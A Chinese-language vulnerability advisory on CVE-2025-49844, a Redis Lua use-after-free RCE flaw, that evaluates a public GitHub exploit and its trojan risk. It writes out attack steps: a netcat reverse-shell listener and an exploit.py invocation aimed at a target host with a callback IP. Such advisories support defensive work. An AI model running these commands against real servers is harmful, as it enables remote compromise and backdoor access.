## CVE-2025-49844 - Redis Use-After-Free (UAF) / 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** Use-After-Free (UAF) / 远程代码执行 (RCE)

**影响应用:** Redis

**危害等级:** Critical

**CVSS评分:** 10.0

**影响版本:** Redis 7.2.x before 7.2.11, Redis 7.4.x before 7.4.6, Redis 8.0.x before 8.0.4, Redis 8.2.x before 8.2.2

**利用条件:** 需要认证 (Authenticated Access Required), 网络可访问 (Network Accessible)

**POC 可用性:** 10

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-49844 是 Redis 数据库中一个极其严重的 Use-After-Free (UAF) 漏洞，存在于其 Lua 脚本引擎中，可导致远程代码执行 (RCE)。该漏洞在威胁情报界引起广泛关注，被评为 CVSS 10.0 的满分漏洞，表明其具有最高级别的危害性和利用潜力。此漏洞由 Wiz 团队在 Pwn2Own Berlin 大赛中发现并披露，其影响范围广泛，涵盖了所有支持 Lua 脚本的 Redis 版本，包括 6.x 至 8.x 的多个主要分支。具体受影响的版本包括 Redis 7.2.x 在 7.2.11 之前、7.4.x 在 7.4.6 之前、8.0.x 在 8.0.4 之前以及 8.2.x 在 8.2.2 之前。UAF 漏洞的本质是程序在释放内存后，错误地再次使用这块内存，攻击者可以利用这种不一致性来控制程序执行流，最终实现任意代码执行。

### POC 有效性分析

该 POC（`CVE-2025-49844 - Redis Lua Interpreter UAF Exploit`）被评估为高质量且功能完整的利用工具，评分为 10 分。其 `README.md` 文件提供了极其详尽的信息，包括安装、使用、功能特性以及利用阶段的分解，显示出其高度的可用性和可靠性。此 POC 不仅仅是一个概念验证，而是一个完整的利用框架，能够绕过现代操作系统的多种安全缓解措施。

1.  **Use-After-Free (UAF) 漏洞利用**: POC 的核心功能是利用 Redis Lua 解释器中的 UAF 漏洞。这意味着它能够精确触发并利用内存被释放后再次使用的缺陷，为后续的内存操作奠定基础。
2.  **ASLR 绕过**: 通过“内存信息泄露”（Memory information leakage）技术，POC 能够获取目标系统的内存布局信息，从而成功绕过地址空间布局随机化（ASLR）。ASLR 是一种常见的防御机制，旨在使攻击者难以预测内存地址，从而阻碍 ROP 等技术的实施。POC 能够有效规避这一机制，大幅提升了利用的成功率。
3.  **DEP/NX 绕过**: 利用“面向返回编程”（Return-Oriented Programming, ROP）技术，POC 能够绕过数据执行保护/不可执行位（DEP/NX）。ROP 通过将程序栈上的返回地址替换为指向现有代码片段（gadgets）的地址，并将这些片段链接起来，以执行攻击者选择的任意操作，即使堆栈或堆是不可执行的。
4.  **堆喷射（Heap Spraying）**: 为了提高利用的可靠性，POC 采用了堆喷射技术。这是一种在堆上分配大量可控内存块的技术，旨在使攻击者能够更可靠地将恶意数据或 shellcode 放置到预期的内存位置。
5.  **任意 Shellcode 执行**: POC 的最终目标是“在目标系统上执行任意 shellcode”，这包括建立反向 Shell 或执行其他系统命令。其功能描述中明确提到可以“建立持久后门访问”，进一步说明了其高级利用能力。
6.  **多阶段利用与内存操作**: POC 明确指出采用了“多阶段利用与内存操作”，表明其利用过程并非单一指令，而是一系列精心编排的步骤，涉及复杂的内存布局和状态转换。
7.  **清晰的文档与使用指南**: `README.md` 文件提供了详细的“安装”和“使用”说明，包括依赖的 Python 包，以及针对漏洞检查和反向 Shell 建立的具体命令行示例。这使得技术人员可以非常容易地部署和使用该工具进行安全测试。

### 利用步骤

攻击者利用此 POC 的基本步骤如下：
1.  **环境准备**: 确保攻击机上安装了 Python 3.6+ 以及 `redis` Python 包 (`pip install redis`)。
2.  **获取 POC**: 通过 Git 克隆 POC 仓库 `git clone https://github.com/Yuri08loveElaina/CVE-2025-49844.git`。
3.  **安装依赖**: 进入 POC 目录并安装所需依赖 `pip install -r requirements.txt`。
4.  **启动监听器**: 在攻击机上启动一个网络监听器，例如 `nc -lvnp 4444`，用于接收反向 Shell 连接。
5.  **执行漏洞利用**: 运行 POC 脚本，指定目标 Redis 服务器的 IP 地址和端口，如果 Redis 需要认证，则提供密码，同时指定攻击机用于反向 Shell 的 IP 地址和端口。例如：`python3 exploit.py -H <target_host> -p <port> [-a <password>] -l <your_ip> -P <your_port>`。
6.  **利用流程**: 脚本会按照预设的利用阶段执行：连接与版本检查、架构检测、堆准备、UAF 对象创建、内存泄露（绕过 ASLR）、ROP 链构造（绕过 DEP/NX）以及最终的 Shellcode 执行，从而在目标系统上建立反向 Shell。

### 投毒风险分析

根据提供的 POC `README.md` 文件内容，此 POC 的投毒风险被评估为较低，约为 10%。这一评估基于以下几点：

1.  **目的明确**: `README.md` 文件清晰地声明了工具的用途是针对 CVE-2025-49844 进行漏洞利用，用于教育和授权的安全测试。其功能描述完全符合一个高水平漏洞利用工具应有的特点，包括绕过各种安全机制（ASLR, DEP/NX）和实现任意代码执行。
2.  **无混淆迹象**: `README.md` 文件中没有提及代码混淆或使用外部可疑脚本的迹象。其依赖项是标准的 `redis` Python 库，没有引入异常的第三方模块。
3.  **合法功能**: “执行任意 shellcode”和“建立持久后门访问”是漏洞成功利用后攻击者可能实现的功能，而不是 POC 工具本身包含的恶意代码。这意味着工具的目标是展示漏洞的潜在影响，而不是秘密地损害使用它的用户。
4.  **免责声明**: POC 明确包含免责声明：“此工具仅用于教育和授权的安全测试目的。作者不对因使用此工具造成的任何 misuse 或 damage 负责。”这进一步表明其开发者是以合法安全研究为目的发布该工具。
5.  **透明度**: 整个文档内容非常透明，详细介绍了攻击链和技术细节，这与隐藏恶意行为的投毒软件行为模式相悖。

综上所述，尽管该 POC 能够实现高度破坏性的远程代码执行，但其本身作为安全研究工具的性质，以及其清晰、透明的文档和合法的功能描述，使得其作为投毒软件的风险极低。用户在使用时应严格遵守其免责声明，仅在授权环境下进行测试。

**项目地址:** https://github.com/Yuri08loveElaina/CVE-2025-49844.git

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49844
